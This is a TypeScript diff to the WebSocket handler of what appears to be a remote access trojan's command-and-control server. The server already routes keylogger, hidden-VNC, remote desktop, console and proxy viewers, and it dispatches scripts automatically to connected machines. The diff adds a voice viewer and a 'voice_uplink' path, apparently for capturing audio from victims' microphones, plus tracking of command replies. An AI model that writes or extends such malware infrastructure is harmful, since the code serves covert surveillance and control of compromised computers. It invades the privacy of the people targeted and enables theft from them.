@@ -17,10 +17,16 @@ type PendingScript = {
   resolve: (value: { ok?: boolean; result?: string; error?: string }) => void;
 };
 
+type PendingCommandReply = {
+  timeout: ReturnType<typeof setTimeout>;
+  resolve: (value: { ok: boolean; message?: string }) => void;
+};
+
 type WsLifecycleDeps = {
   maxClientPayloadBytes: number;
   maxViewerPayloadBytes: number;
   pendingScripts: Map<string, PendingScript>;
+  pendingCommandReplies: Map<string, PendingCommandReply>;
   rdStreamingState: Map<string, unknown>;
   hvncStreamingState: Map<string, unknown>;
   getNotificationConfig: () => { keywords?: string[]; minIntervalMs?: number };
@@ -31,6 +37,7 @@ type WsLifecycleDeps = {
   handleProcessViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleKeyloggerViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleProxyViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
+  handleVoiceViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleNotificationViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleConsoleViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleRemoteDesktopViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
@@ -39,6 +46,7 @@ type WsLifecycleDeps = {
   handleProcessViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleProxyViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
+  handleVoiceViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   takePendingNotificationScreenshot: (clientId: string) => any;
   storeNotificationScreenshot: (
@@ -58,6 +66,8 @@ type WsLifecycleDeps = {
   handleNotificationScreenshotFailure: (commandId: string | undefined, ok: boolean | undefined, message: string | undefined) => void;
   handlePluginEvent: (clientId: string, payload: any) => void;
   handleNotification: (clientId: string, payload: any) => void;
+  handleVoiceUplink: (clientId: string, payload: any) => void;
+  cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
   stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
   sendDesktopCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
   sendHVNCCommand: (target: ClientInfo, commandType: string, payload: Record<string, unknown>) => void;
@@ -77,6 +87,7 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   if (role === "process_viewer") return deps.handleProcessViewerOpen(ws);
   if (role === "keylogger_viewer") return deps.handleKeyloggerViewerOpen(ws);
   if (role === "proxy_viewer") return deps.handleProxyViewerOpen(ws);
+  if (role === "voice_viewer") return deps.handleVoiceViewerOpen(ws);
   if (role === "notifications_viewer") return deps.handleNotificationViewerOpen(ws);
 
   const id = clientId || uuidv4();
@@ -134,6 +145,7 @@ export function handleWebSocketMessage(
   if (socketRole === "process_viewer") return deps.handleProcessViewerMessage(ws, message);
   if (socketRole === "keylogger_viewer") return deps.handleKeyloggerViewerMessage(ws, message);
   if (socketRole === "proxy_viewer") return deps.handleProxyViewerMessage(ws, message);
+  if (socketRole === "voice_viewer") return deps.handleVoiceViewerMessage(ws, message);
   if (socketRole === "notifications_viewer") return;
 
   const { clientId, ip } = ws.data;
@@ -213,6 +225,17 @@ export function handleWebSocketMessage(
       case "file_read_result":
       case "file_search_result":
       case "command_result":
+        if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
+          const pending = deps.pendingCommandReplies.get((payload as any).commandId);
+          if (pending) {
+            clearTimeout(pending.timeout);
+            pending.resolve({
+              ok: Boolean((payload as any).ok),
+              message: typeof (payload as any).message === "string" ? (payload as any).message : "",
+            });
+            deps.pendingCommandReplies.delete((payload as any).commandId);
+          }
+        }
         if (typeof (payload as any).commandId === "string") {
           deps.notifyRdInputLatency((payload as any).commandId);
         }
@@ -258,6 +281,9 @@ export function handleWebSocketMessage(
         break;
       case "notification":
         deps.handleNotification(info.id, payload);
+        break;
+      case "voice_uplink":
+        deps.handleVoiceUplink(info.id, payload);
         break;
       default:
         break;
@@ -353,6 +379,11 @@ export function handleWebSocketClose(
     if (sessionId) {
       sessionManager.deleteProxySession(sessionId);
     }
+    return;
+  }
+
+  if (role === "voice_viewer") {
+    deps.cleanupVoiceViewer(ws);
     return;
   }
 
